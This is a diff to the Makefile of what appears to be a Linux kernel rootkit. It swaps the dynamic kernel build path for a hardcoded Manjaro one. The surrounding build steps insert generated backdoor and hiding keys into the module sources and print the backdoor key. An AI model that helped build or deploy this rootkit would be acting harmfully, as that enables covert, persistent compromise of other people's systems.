@@ -68,7 +68,7 @@ all:
 	@sed -i "s/\(uint64_t auto_bdkey = \)[^;]*;/\1$(BDKEY);/" src/sock.c
 	@sed -i "s/\(uint64_t auto_unhidekey = \)[^;]*;/\1$(UNHIDEKEY);/" src/kovid.c
 	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\1$(EBPFHIDEKEY);/" tools/ebpf/main.c
-	make  -C  /lib/modules/$(shell uname -r)/build M=$(PWD) modules
+	make  -C  /lib/modules/6.12.12-2-MANJARO/build M=$(PWD) modules
 	@echo "Build complete."
 	@echo -n "Backdoor KEY: "
 	@echo "\033[1;37m$(BDKEY)\033[0m" | sed 's/0x//'
@@ -137,7 +137,7 @@ reset-auto:
 	@sed -i "s/\(uint64_t auto_ebpfhidenkey = \)[^;]*;/\10x0000000000000000;/" tools/ebpf/main.c
 
 clean: reset-auto
-	@make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
+	@make -C /lib/modules/6.12.12-2-MANJARO/build M=$(PWD) clean
 	@rm -f *.o src/*.o $(persist)
 	@echo "Clean."
 
